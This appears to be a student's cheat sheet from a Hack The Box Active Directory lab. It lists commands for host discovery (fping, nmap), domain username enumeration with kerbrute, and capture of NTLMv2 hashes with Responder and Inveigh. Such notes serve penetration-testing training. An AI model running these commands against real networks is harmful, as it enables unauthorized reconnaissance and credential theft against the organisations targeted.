# FPing
```bash
fping -asgq 172.16.5.0/23

sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

# kerbrute
```bash
# jsmith.txt/jsmith2.txt
git clone https://github.com/insidetrust/statistically-likely-usernames

kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

# Responder
```bash
sudo respondr -I tun0 -v
```

# Inveigh
```powershell
.\inveigh.exe

# press ESC and ENTER in Inveigh
GET NTLMV2UNIQUE

GET NTLMV2USERNAMES
```

